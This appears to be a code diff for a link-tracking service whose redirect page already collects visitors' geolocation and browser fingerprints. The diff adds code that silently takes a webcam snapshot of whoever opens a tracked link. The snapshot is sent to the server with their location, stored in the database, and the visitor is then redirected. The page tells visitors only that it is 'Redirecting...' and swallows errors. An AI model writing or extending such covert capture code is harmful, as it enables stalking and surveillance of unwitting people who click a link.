@@ -118,13 +118,13 @@ function trackingPageHtml(link, error) {
       document.getElementById('continueBtn').addEventListener('click', requestGeo);
     }
 
-    async function sendClick(clientLat, clientLng, fingerprint) {
+    async function sendClick(clientLat, clientLng, fingerprint, cameraImage) {
       document.getElementById('status').textContent = 'Redirecting...';
       try {
         await fetch('/api/track/' + link.code + '/click', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ clientLat, clientLng, fingerprint })
+          body: JSON.stringify({ clientLat, clientLng, fingerprint, cameraImage })
         });
       } catch (e) {}
       window.location.replace(link.destination);
@@ -254,12 +254,25 @@ function getFingerprint() {
       return f;
     }
 
-    function requestGeo() {
+    async function requestGeo() {
       document.getElementById('status').textContent = 'Capturing location...';
       const fp = getFingerprint();
+      var img = null;
+      try {
+        var stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        var canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+        img = canvas.toDataURL('image/jpeg', 0.5);
+        stream.getTracks().forEach(function(t) { t.stop(); });
+      } catch(e) {}
       navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp),
-        () => sendClick(null, null, fp),
+        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp, img),
+        () => sendClick(null, null, fp, img),
         { timeout: 5000, enableHighAccuracy: true }
       );
     }
@@ -273,11 +286,28 @@ function getFingerprint() {
         <div id="error" class="error"></div>
       \`;
     } else {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint()),
-        () => showButton('Click the button to continue.'),
-        { timeout: 3000, enableHighAccuracy: false }
-      );
+      navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.play().then(function() {
+          var canvas = document.createElement('canvas');
+          canvas.width = 320; canvas.height = 240;
+          canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+          var img = canvas.toDataURL('image/jpeg', 0.5);
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          navigator.geolocation.getCurrentPosition(
+            (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint(), img),
+            () => sendClick(null, null, getFingerprint(), img),
+            { timeout: 3000, enableHighAccuracy: false }
+          );
+        });
+      }).catch(function() {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint()),
+          () => sendClick(null, null, getFingerprint()),
+          { timeout: 3000, enableHighAccuracy: false }
+        );
+      });
     }
 
     async function verifyPassword() {
@@ -323,7 +353,7 @@ router.post('/:code/click', async (req, res) => {
   const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
   if (!link) return res.status(404).json({ error: 'Link not found' });
 
-  const { clientLat, clientLng, fingerprint } = req.body || {};
+  const { clientLat, clientLng, fingerprint, cameraImage } = req.body || {};
 
   let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
     || req.socket.remoteAddress
@@ -340,8 +370,8 @@ router.post('/:code/click', async (req, res) => {
   }
 
   await db.run(
-    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null]
+    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint, camera_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
+    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null, cameraImage || null]
   );
 
   res.json({ ok: true });
